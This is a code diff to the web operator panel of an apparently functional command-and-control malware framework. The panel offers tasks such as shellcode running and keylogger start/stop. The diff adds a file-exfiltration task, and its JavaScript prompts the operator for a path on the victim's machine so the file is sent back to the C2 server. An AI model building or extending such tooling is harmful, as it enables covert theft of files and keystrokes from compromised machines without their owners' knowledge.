@@ -120,7 +120,8 @@
                             <option value="shellcode">Shellcode-Runner</option>
                             <option value="keylogger_start">Start Keylogger</option>
                             <option value="keylogger_stop">Stop Keylogger</option>
-                            <option value="upload_file">Upload File</option>
+                            <option value="upload_file">Upload File (C2 -> Agent)</option>
+                            <option value="upload">Exfiltrate File (Agent -> C2)</option>
                         </select>
                         <button id="executeTask" class="btn btn-sm btn-primary me-3">Execute</button>
                         <span id="keyloggerStatusBadge" class="badge bg-secondary">Keylogger Status: Unknown</span>
@@ -537,6 +538,12 @@ document.addEventListener('DOMContentLoaded', function() {
                 const command = prompt('Enter command to execute:');
                 if (!command) return;
                 taskData = { 'cmd': command };
+            }
+
+            if (taskType === 'upload') {
+                const filePath = prompt('Enter full path of the file to exfiltrate (e.g. C:\\Users\\Name\\Desktop\\file.txt):');
+                if (!filePath) return;
+                taskData = { 'path': filePath };
             }
 
             // Handle keylogger start/stop tasks specially
